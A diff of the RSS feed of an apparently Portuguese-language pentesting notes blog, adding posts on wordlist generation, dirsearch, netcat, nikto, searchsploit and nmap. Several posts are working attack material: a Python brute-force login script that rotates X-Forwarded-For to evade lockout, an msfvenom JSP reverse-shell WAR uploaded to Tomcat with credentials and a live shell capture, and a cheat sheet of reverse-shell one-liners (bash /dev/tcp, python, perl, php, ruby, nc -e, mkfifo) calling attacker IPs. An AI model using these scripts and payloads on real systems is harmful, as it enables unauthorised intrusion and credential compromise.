@@ -7,10 +7,153 @@
     <ttl>1440</ttl>
     <generator>Hugo 0.73.0</generator>
     <language>en-us</language>
-    <lastBuildDate>Wed, 22 Jul 2020 19:29:40 UT</lastBuildDate>
+    <lastBuildDate>Thu, 23 Jul 2020 03:19:41 UT</lastBuildDate>
     <atom:link href="/posts/index.xml" rel="self" type="application/rss+xml" />
     <item>
-      <title>Tools para Pentest</title>
+      <title>Wordlist com Palavras do Site</title>
+      <link>/posts/wordlist/</link>
+      <pubDate>Thu, 23 Jul 2020 02:58:13 UT</pubDate>
+      <guid>/posts/wordlist/</guid>
+      <description>Gerando wordlist com palavras do site cewl -w wordlists.txt -d 10 -m 1 http://seualvo.com/
+Crie o arquivo brute.py Para executa-lo basta rodar o comando:
+$ python3 brute.py
+import re import requests def open_ressources(file_path): return [item.replace(&amp;#34;\n&amp;#34;, &amp;#34;&amp;#34;) for item in open(file_path).readlines()] #alvo host = &amp;#39;http://seualvo.com&amp;#39; #url do login login_url = host &#43; &amp;#39;/admin/login&amp;#39; #user username = &amp;#39;admin&amp;#39; #caminho da wordlist wordlist = open_ressources(&amp;#39;/root/wordlists.txt&amp;#39;) for password in wordlist: session = requests.Session() login_page = session.</description>
+      <content:encoded><![CDATA[Gerando wordlist com palavras do site cewl -w wordlists.txt -d 10 -m 1 http://seualvo.com/
+Crie o arquivo brute.py Para executa-lo basta rodar o comando:
+$ python3 brute.py
+import re import requests def open_ressources(file_path): return [item.replace(&amp;#34;\n&amp;#34;, &amp;#34;&amp;#34;) for item in open(file_path).readlines()] #alvo host = &amp;#39;http://seualvo.com&amp;#39; #url do login login_url = host &#43; &amp;#39;/admin/login&amp;#39; #user username = &amp;#39;admin&amp;#39; #caminho da wordlist wordlist = open_ressources(&amp;#39;/root/wordlists.txt&amp;#39;) for password in wordlist: session = requests.Session() login_page = session.get(login_url) csrf_token = re.search(&amp;#39;input.&#43;?name=&amp;#34;tokenCSRF&amp;#34;.&#43;?value=&amp;#34;(.&#43;?)&amp;#34;&amp;#39;, login_page.text).group(1) print(&amp;#39;[*] Trying: {p}&amp;#39;.format(p = password)) headers = { &amp;#39;X-Forwarded-For&amp;#39;: password, &amp;#39;User-Agent&amp;#39;: &amp;#39;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36&amp;#39;, &amp;#39;Referer&amp;#39;: login_url } data = { &amp;#39;tokenCSRF&amp;#39;: csrf_token, &amp;#39;username&amp;#39;: username, &amp;#39;password&amp;#39;: password, &amp;#39;save&amp;#39;: &amp;#39;&amp;#39; } login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False) if &amp;#39;location&amp;#39; in login_result.headers: if &amp;#39;/admin/dashboard&amp;#39; in login_result.headers[&amp;#39;location&amp;#39;]: print() print(&amp;#39;SUCCESS: Password found!&amp;#39;) print(&amp;#39;Use {u}:{p} to login.&amp;#39;.format(u = username, p = password)) print() break ]]></content:encoded>
+    </item>
+    <item>
+      <title>Dirsearch</title>
+      <link>/posts/dirsearch/</link>
+      <pubDate>Thu, 23 Jul 2020 02:37:57 UT</pubDate>
+      <guid>/posts/dirsearch/</guid>
+      <description>DIRSEARCH ================ https://github.com/maurosoria/dirsearch
+O dirsearch é uma ferramenta simples de linha de comando projetada para diretórios e arquivos de força bruta em sites.
+Particularmente prefiro ele ao invés do DIRB ou GoBuster, já obtive mais resultados com ele, porém depois vou escrever sobre essas outras duas ferramentas aqui também.
+Uso git clone https://github.com/maurosoria/dirsearch.git
+$ cd dirsearch
+python3 dirsearch.py -u &amp;lt;URL&amp;gt; -e &amp;lt;EXTENSION&amp;gt;
+Exemplo $ python3 dirsearch.py -u http://sitedoalvo.com.br(ou IP) -e *</description>
+      <content:encoded><![CDATA[DIRSEARCH ================ https://github.com/maurosoria/dirsearch
+O dirsearch é uma ferramenta simples de linha de comando projetada para diretórios e arquivos de força bruta em sites.
+Particularmente prefiro ele ao invés do DIRB ou GoBuster, já obtive mais resultados com ele, porém depois vou escrever sobre essas outras duas ferramentas aqui também.
+Uso git clone https://github.com/maurosoria/dirsearch.git
+$ cd dirsearch
+python3 dirsearch.py -u &amp;lt;URL&amp;gt; -e &amp;lt;EXTENSION&amp;gt;
+Exemplo $ python3 dirsearch.py -u http://sitedoalvo.com.br(ou IP) -e *
+_|. _ _ _ _ _ _|_ v0.3.9 (_||| _) (/_(_|| (_| ) Extensions: | HTTP method: getSuffixes: CHANGELOG.md | HTTP method: get | Threads: 10 | Wordlist size: 6552 | Request count: 6552 Error Log: /root/dirsearch/logs/errors-20-06-29_23-59-23.log Target: http://10.10.10.185 Output File: /root/dirsearch/reports/10.10.10.185/20-06-29_23-59-24 [23:59:24] Starting: [00:00:12] 301 - 313B - /images -&amp;gt; http://10.10.10.185/images/ [00:00:14] 403 - 277B - /index.shtml [00:00:14] 200 - 67KB - /index.php [00:00:14] 200 - 67KB - /index.php/login/ [00:00:14] 403 - 277B - /install.sql [00:00:17] 403 - 277B - /localhost.sql [00:00:17] 403 - 277B - /log.sqlite [00:00:18] 200 - 4KB - /login.php [00:00:18] 403 - 277B - /login.shtml [00:00:19] 403 - 277B - /logs.sqlite O dirsearch vai encontrar pastas e urls uteis para a exploração de vulnerabilidades.
+]]></content:encoded>
+    </item>
+    <item>
+      <title>sh_MSFvenom</title>
+      <link>/posts/sh_msfvenom/</link>
+      <pubDate>Thu, 23 Jul 2020 02:25:57 UT</pubDate>
+      <guid>/posts/sh_msfvenom/</guid>
+      <description>echo &amp;#34;-------------------------------------CRIANDO UM EXPLOID COM MSFVENOM----------------------------------------------------&amp;#34; msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.29 LPORT=4444 -f war &amp;gt; exploit.war #IP do seu local host &#43; porta #Criação do arquivo .WAR echo &amp;#34;-------------------------------------UPLOAD DO EXPLOIT NO ALVO---------------------------------------------------------&amp;#34; curl --user &amp;#39;tomcat:$3cureP4s5w0rd123!&amp;#39; --upload-file exploit.war &amp;#34;http://10.10.10.194:8080/manager/text/deploy?path=/exploit.war&amp;#34; #O ataque foi em um alvo cujo tomcat9 estava vulneravel #IP do RHOST(alvo) &#43; porta da aplicação #upload do arquivo .war echo &amp;#34;------------------------------------sucesso no upload -----------------------------------------------------&amp;#34; echo &amp;#34;-----------------------------------Se conectando ao netcat---------------------------------------------------------&amp;#34; echo &amp;#34;----------------------------------- http://10.</description>
+      <content:encoded><![CDATA[echo &amp;#34;-------------------------------------CRIANDO UM EXPLOID COM MSFVENOM----------------------------------------------------&amp;#34; msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.29 LPORT=4444 -f war &amp;gt; exploit.war #IP do seu local host &#43; porta #Criação do arquivo .WAR echo &amp;#34;-------------------------------------UPLOAD DO EXPLOIT NO ALVO---------------------------------------------------------&amp;#34; curl --user &amp;#39;tomcat:$3cureP4s5w0rd123!&amp;#39; --upload-file exploit.war &amp;#34;http://10.10.10.194:8080/manager/text/deploy?path=/exploit.war&amp;#34; #O ataque foi em um alvo cujo tomcat9 estava vulneravel #IP do RHOST(alvo) &#43; porta da aplicação #upload do arquivo .war echo &amp;#34;------------------------------------sucesso no upload -----------------------------------------------------&amp;#34; echo &amp;#34;-----------------------------------Se conectando ao netcat---------------------------------------------------------&amp;#34; echo &amp;#34;----------------------------------- http://10.10.10.194:8080/exploit.war ---------------------------------------------&amp;#34; nc -nvlp 4444 #em outra aba do terminal, deixe escutando na porta que desejar # nc -nvlp 4444 Quando estiver ouvindo a porta, vá no navegador e chame o arquivo que você acabou de fazer o upload
+http://10.10.10.194:8080/exploit.war/
+volte no terminal, ele vai ter conectado via shell agora execute o shell reverso em python para o term
+listening on [any] 4444 &amp;hellip; connect to [10.10.14.29] from (UNKNOWN) [10.10.10.194] 50476
+$ python3 -c &amp;quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&amp;quot;
+]]></content:encoded>
+    </item>
+    <item>
+      <title>The_silver_searcher</title>
+      <link>/posts/the_silver_searcher/</link>
+      <pubDate>Thu, 23 Jul 2020 02:17:35 UT</pubDate>
+      <guid>/posts/the_silver_searcher/</guid>
+      <description>AG ====== https://github.com/ggreer/the_silver_searcher
+Uma ferramenta de busca de código semelhante a ack, com foco na velocidade, faz uma busca recursiva em diretórios e arquivos.
+apt-get install silversearcher-ag</description>
+      <content:encoded><![CDATA[AG ====== https://github.com/ggreer/the_silver_searcher
+Uma ferramenta de busca de código semelhante a ack, com foco na velocidade, faz uma busca recursiva em diretórios e arquivos.
+apt-get install silversearcher-ag
+]]></content:encoded>
+    </item>
+    <item>
+      <title>Netcat</title>
+      <link>/posts/netcat/</link>
+      <pubDate>Thu, 23 Jul 2020 02:02:18 UT</pubDate>
+      <guid>/posts/netcat/</guid>
+      <description>Netcat ================
+O Netcat é um utilitário que lê e grava dados nas conexões de rede, usando o protocolo TCP ou UDP. Ele foi projetado para ser uma ferramenta confiável de &amp;ldquo;back-end&amp;rdquo; que pode ser usada diretamente ou direcionada por outros programas e scripts. Ao mesmo tempo, é uma ferramenta de depuração e exploração de rede rica em recursos, pois pode criar quase qualquer tipo de conexão que você precisa e possui vários recursos internos interessantes.</description>
+      <content:encoded><![CDATA[Netcat ================
+O Netcat é um utilitário que lê e grava dados nas conexões de rede, usando o protocolo TCP ou UDP. Ele foi projetado para ser uma ferramenta confiável de &amp;ldquo;back-end&amp;rdquo; que pode ser usada diretamente ou direcionada por outros programas e scripts. Ao mesmo tempo, é uma ferramenta de depuração e exploração de rede rica em recursos, pois pode criar quase qualquer tipo de conexão que você precisa e possui vários recursos internos interessantes. Os usos comuns incluem:
+&#43; Proxies TCP simples &#43; Clientes e servidores HTTP baseados em shell-script &#43; Teste de daemon de rede &#43; A Socks ou HTTP ProxyCommand para ssh Sintaxe:
+$ nc -nlvp 1234
+-n Não faça pesquisas de serviço ou DNS em endereços, nomes de host ou portas especificados.
+-l Usado para especificar que o nc deve escutar uma conexão de entrada em vez de iniciar uma conexão com um host remoto. É um erro usar esta opção em conjunto com as opções -p, -s ou -z. Além disso, qualquer tempo limite especificado com a opção -w é ignorado.
+-v Faça nc dar uma saída mais detalhada.
+-p source_port Especifica a porta de origem que a nc deve usar, sujeita a restrições e disponibilidade de privilégios.
+Ou seja, com ele podemos ouvir a porta TCP/UDP podemos colocar o nc escutando na porta 1234 uma conexão, para usar um shell reverso por exemplo.
+]]></content:encoded>
+    </item>
+    <item>
+      <title>Reverse Shell</title>
+      <link>/posts/dicasdereverseshell/</link>
+      <pubDate>Thu, 23 Jul 2020 01:51:31 UT</pubDate>
+      <guid>/posts/dicasdereverseshell/</guid>
+      <description>Python =====================
+python -c &#39;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39; python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;quot;10.10.14.15&amp;quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bin/sh&amp;quot;,&amp;quot;-i&amp;quot;]);&#39; Bash =====================
+bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.19.68/4455 0&amp;gt;&amp;amp;1 PERL =====================
+perl -e &#39;use Socket;$i=&amp;quot;10.0.0.1&amp;quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;quot;tcp&amp;quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDOUT,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDERR,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);exec(&amp;quot;/bin/sh -i&amp;quot;);};&#39; PHP =====================
+php -r &#39;$sock=fsockopen(&amp;quot;10.0.0.1&amp;quot;,1234);exec(&amp;quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;quot;);&#39; Ruby =====================
+ruby -rsocket -e&#39;f=TCPSocket.open(&amp;quot;10.0.0.1&amp;quot;,1234).to_i;exec sprintf(&amp;quot;/bin/sh -i &amp;lt;&amp;amp;%d &amp;gt;&amp;amp;%d 2&amp;gt;&amp;amp;%d&amp;quot;,f,f,f)&#39; Netcat =====================
+nc -e /bin/sh 10.0.0.1 1234 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.0.0.1 1234 &amp;gt;/tmp/f Java =====================
+r = Runtime.getRuntime() p = r.exec([&amp;quot;/bin/bash&amp;quot;,&amp;quot;-c&amp;quot;,&amp;quot;exec 5&amp;lt;&amp;gt;/dev/tcp/10.</description>
+      <content:encoded><![CDATA[Python =====================
+python -c &#39;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39; python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;quot;10.10.14.15&amp;quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bin/sh&amp;quot;,&amp;quot;-i&amp;quot;]);&#39; Bash =====================
+bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.19.68/4455 0&amp;gt;&amp;amp;1 PERL =====================
+perl -e &#39;use Socket;$i=&amp;quot;10.0.0.1&amp;quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;quot;tcp&amp;quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDOUT,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDERR,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);exec(&amp;quot;/bin/sh -i&amp;quot;);};&#39; PHP =====================
+php -r &#39;$sock=fsockopen(&amp;quot;10.0.0.1&amp;quot;,1234);exec(&amp;quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;quot;);&#39; Ruby =====================
+ruby -rsocket -e&#39;f=TCPSocket.open(&amp;quot;10.0.0.1&amp;quot;,1234).to_i;exec sprintf(&amp;quot;/bin/sh -i &amp;lt;&amp;amp;%d &amp;gt;&amp;amp;%d 2&amp;gt;&amp;amp;%d&amp;quot;,f,f,f)&#39; Netcat =====================
+nc -e /bin/sh 10.0.0.1 1234 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.0.0.1 1234 &amp;gt;/tmp/f Java =====================
+r = Runtime.getRuntime() p = r.exec([&amp;quot;/bin/bash&amp;quot;,&amp;quot;-c&amp;quot;,&amp;quot;exec 5&amp;lt;&amp;gt;/dev/tcp/10.0.0.1/2002;cat &amp;lt;&amp;amp;5 | while read line; do \$line 2&amp;gt;&amp;amp;5 &amp;gt;&amp;amp;5; done&amp;quot;] as String[]) p.waitFor()[Untested submission from anonymous reader] xterm =====================
+xterm -display 10.0.0.1:1 Xnest :1 xhost &#43;targetip ]]></content:encoded>
+    </item>
+    <item>
+      <title>Nikto</title>
+      <link>/posts/nikto/</link>
+      <pubDate>Thu, 23 Jul 2020 01:47:23 UT</pubDate>
+      <guid>/posts/nikto/</guid>
+      <description>NIKTO ================
+Examine o servidor da Web em busca de vulnerabilidades conhecidas, incluindo:
+ Configurações incorretas de servidor e software Arquivos e programas padrão Arquivos e programas inseguros Servidores e programas desatualizados  Não é necessário fazer a instalação do mesmo pois ele é um script perl.
+Ele vem nativo no kali, para atualizar recomendo baixar direto do git deles.
+https://github.com/sullo/nikto
+git clone https://github.com/sullo/nikto # Main script is in program/ cd nikto/program # Run using the shebang interpreter .</description>
+      <content:encoded><![CDATA[NIKTO ================
+Examine o servidor da Web em busca de vulnerabilidades conhecidas, incluindo:
+ Configurações incorretas de servidor e software Arquivos e programas padrão Arquivos e programas inseguros Servidores e programas desatualizados  Não é necessário fazer a instalação do mesmo pois ele é um script perl.
+Ele vem nativo no kali, para atualizar recomendo baixar direto do git deles.
+https://github.com/sullo/nikto
+git clone https://github.com/sullo/nikto # Main script is in program/ cd nikto/program # Run using the shebang interpreter ./nikto.pl -h http://www.example.com # Run using perl (if you forget to chmod) perl nikto.pl -h http://www.example.com -h &#43; alvo (por padrão setada porta 80) -o posso gerar relatório em html ou txt, csv. -p posso setar as portas que quero separados por virgula. exemplo: nikto -h 192.168.0.126 -p 8081, 443 -o scan.html
+Toda vez que precisar rodar o nikto em diferentes diretorios do seu alvo, é necessário colocar o &amp;lsquo;http&amp;rsquo; na frente.
+ex: nikto -h http://192.168.0.126/files -p 8081, 443 -o scan.html
+]]></content:encoded>
+    </item>
+    <item>
+      <title>Searchexploit</title>
+      <link>/posts/searchexploit/</link>
+      <pubDate>Thu, 23 Jul 2020 01:46:40 UT</pubDate>
+      <guid>/posts/searchexploit/</guid>
+      <description>SEARCHSPLOIT ================
+Searchsploit, é uma ferramenta de pesquisa de linha de comando do Exploit-DB que também permite que você leve uma cópia do Exploit Database com você, aonde quer que você vá. O SearchSploit oferece a capacidade de realizar pesquisas off-line detalhadas por meio de sua cópia do repositório com check-out local. Esse recurso é particularmente útil para avaliações de segurança em redes segregadas ou com falta de ar sem acesso à Internet.</description>
+      <content:encoded><![CDATA[SEARCHSPLOIT ================
+Searchsploit, é uma ferramenta de pesquisa de linha de comando do Exploit-DB que também permite que você leve uma cópia do Exploit Database com você, aonde quer que você vá. O SearchSploit oferece a capacidade de realizar pesquisas off-line detalhadas por meio de sua cópia do repositório com check-out local. Esse recurso é particularmente útil para avaliações de segurança em redes segregadas ou com falta de ar sem acesso à Internet.
+Com as informações dos serviços coletados pelo NMAP, seria maneiro procurar no searchsploit se este serviço contém alguma vulnerabilidade, procurando um exploit para ele.
+Neste caso podemos usar o searchsploit da seguinte maneira:
+fpmatta@T-REX ~&amp;gt; searchsploit vsftpd ------------------------------------------- --------------------------------- Exploit Title | Path ------------------------------------------- --------------------------------- vsftpd 2.0.5 - &amp;#39;CWD&amp;#39; (Authenticated) Remot | linux/dos/5814.pl vsftpd 2.0.5 - &amp;#39;deny_file&amp;#39; Option Remote D | windows/dos/31818.sh vsftpd 2.0.5 - &amp;#39;deny_file&amp;#39; Option Remote D | windows/dos/31819.pl vsftpd 2.3.2 - Denial of Service | linux/dos/16270.c vsftpd 2.3.4 - Backdoor Command Execution | unix/remote/17491.rb ------------------------------------------- --------------------------------- Para atualizar a base do searchsploit faça:
+$ searchsploit -u
+Se não tiver ele instalado no seu S.O (caso não esteja utilizando o Kali linux):
+Clone o repositório, adicione o binário ao seu $PATH e edite o arquivo de configuração para refletir o caminho do git:
+$ sudo git clone https://github.com/offensive-security/exploitdb.git /opt/exploitdb
+$ sudo ln -sf /opt/exploitdb/searchsploit /usr/local/bin/searchsploit
+]]></content:encoded>
+    </item>
+    <item>
+      <title>NMAP</title>
       <link>/posts/toolsforpentest/</link>
       <pubDate>Wed, 15 Jul 2020 18:02:31 UT</pubDate>
       <guid>/posts/toolsforpentest/</guid>
@@ -36,19 +179,7 @@ nmap -O 192.168.1.50 Quantos hosts ativos.
 nmap -sP 192.168.1.0/24 Script para automatizar o processo de Scan em hosts ativos, pode personalizar com suas flags favoritas.
 # nano maroto_scan.sh
 #!/bin/bash echo &amp;#34;Insira o Range:&amp;#34; read RANGE nmap -sP $RANGE | grep for | cut -d &amp;#34; &amp;#34; -f5 echo &amp;#34;Isso aê&amp;#34; Para tornar executável o script faça:
-# chmod &#43;x maroto_scan.sh &amp;gt;&amp;gt;Resumo Porta aberta = SYN &#43; ACK Porta Fechada = RST # hping3 --syn -c 1 -p 80 sitedeteste.com SYN ACK = Flag:SA # hping3 --syn -c 1 -p 8000 192.168.0.11 RST = Flag:RA ( reset ack ) # nmap -sS -p 80 192.168.0.113 (sem ruidos) # nmap -sV -p 80 192.168.0.113 (versoes dos serviços, porém bem barulhento) # nmap -A 192.168.0.113 (full scan, ele vai utilizaar recursos do NMAP para filtrar o maxímo que conseguir) SEARCHSPLOIT ================
-Searchsploit, é uma ferramenta de pesquisa de linha de comando do Exploit-DB que também permite que você leve uma cópia do Exploit Database com você, aonde quer que você vá. O SearchSploit oferece a capacidade de realizar pesquisas off-line detalhadas por meio de sua cópia do repositório com check-out local. Esse recurso é particularmente útil para avaliações de segurança em redes segregadas ou com falta de ar sem acesso à Internet.
-Com as informações dos serviços coletados acima pelo NMAP, seria maneiro procurar no searchsploit se este serviço contém alguma vulnerabilidade, procurando um exploit para ele.
-Neste caso podemos usar o searchsploit da seguinte maneira:
-fpmatta@T-REX ~&amp;gt; searchsploit vsftpd ------------------------------------------- --------------------------------- Exploit Title | Path ------------------------------------------- --------------------------------- vsftpd 2.0.5 - &amp;#39;CWD&amp;#39; (Authenticated) Remot | linux/dos/5814.pl vsftpd 2.0.5 - &amp;#39;deny_file&amp;#39; Option Remote D | windows/dos/31818.sh vsftpd 2.0.5 - &amp;#39;deny_file&amp;#39; Option Remote D | windows/dos/31819.pl vsftpd 2.3.2 - Denial of Service | linux/dos/16270.c vsftpd 2.3.4 - Backdoor Command Execution | unix/remote/17491.rb ------------------------------------------- --------------------------------- NIKTO ================
-Examine o servidor da Web em busca de vulnerabilidades conhecidas, incluindo:
- Configurações incorretas de servidor e software Arquivos e programas padrão Arquivos e programas inseguros Servidores e programas desatualizados  Não é necessário fazer a instalação do mesmo pois ele é um script perl.
-Ele vem nativo no kali, para atualizar recomendo baixar direto do git deles.
-https://github.com/sullo/nikto
-git clone https://github.com/sullo/nikto # Main script is in program/ cd nikto/program # Run using the shebang interpreter ./nikto.pl -h http://www.example.com # Run using perl (if you forget to chmod) perl nikto.pl -h http://www.example.com -h &#43; alvo (por padrão setada porta 80) -o posso gerar relatório em html ou txt, csv. -p posso setar as portas que quero separados por virgula. exemplo: nikto -h 192.168.0.126 -p 8081, 443 -o scan.html
-Toda vez que precisar rodar o nikto em diferentes diretorios do seu alvo, é necessário colocar o &amp;lsquo;http&amp;rsquo; na frente.
-ex: nikto -h http://192.168.0.126/files -p 8081, 443 -o scan.html
-]]></content:encoded>
+# chmod &#43;x maroto_scan.sh &amp;gt;&amp;gt;Resumo Porta aberta = SYN &#43; ACK Porta Fechada = RST # hping3 --syn -c 1 -p 80 sitedeteste.com SYN ACK = Flag:SA # hping3 --syn -c 1 -p 8000 192.168.0.11 RST = Flag:RA ( reset ack ) # nmap -sS -p 80 192.168.0.113 (sem ruidos) # nmap -sV -p 80 192.168.0.113 (versoes dos serviços, porém bem barulhento) # nmap -A 192.168.0.113 (full scan, ele vai utilizaar recursos do NMAP para filtrar o maxímo que conseguir) ]]></content:encoded>
     </item>
   </channel>
 </rss>
